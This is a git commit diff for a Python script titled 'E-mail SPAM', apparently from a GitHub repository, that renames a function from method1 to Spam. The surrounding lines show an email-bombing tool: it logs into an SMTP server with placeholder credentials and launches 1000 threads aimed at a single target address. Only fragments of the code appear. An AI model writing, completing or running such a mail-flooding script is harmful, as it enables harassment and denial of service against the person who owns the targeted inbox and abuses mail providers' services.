7a80b489f94f8f6557c80bc908826f07987ca563
Imeldushiii <91779600+Imeldushiii@users.noreply.github.com>
2021-12-01 23:16:48 +0100

    Update E-mail SPAM.py

--- E-mail SPAM/E-mail SPAM.py
+++ E-mail SPAM/E-mail SPAM.py
@@ -6,7 +6,7 @@ target = "TARGET EMAIL"
 mail = "YOUR EMAIL"
 SMTP = "EMAIL SMTP"
 PASS = "YOURPSSWORD"
-def method1(host,target, smtp, password):
+def Spam(host,target, smtp, password):
     try:
         global number
         servere = smtplib.SMTP(smtp, 587)
@@ -22,7 +22,7 @@ def method1(host,target, smtp, password):
 def start():
     threads = []
     for i in range(1000):
-        th = threading.Thread(target=method1, args=(mail, target,SMTP, PASS))
+        th = threading.Thread(target=Spam, args=(mail, target,SMTP, PASS))
         threads.append(th)
     for i in range(1000):
         threads[i].start()
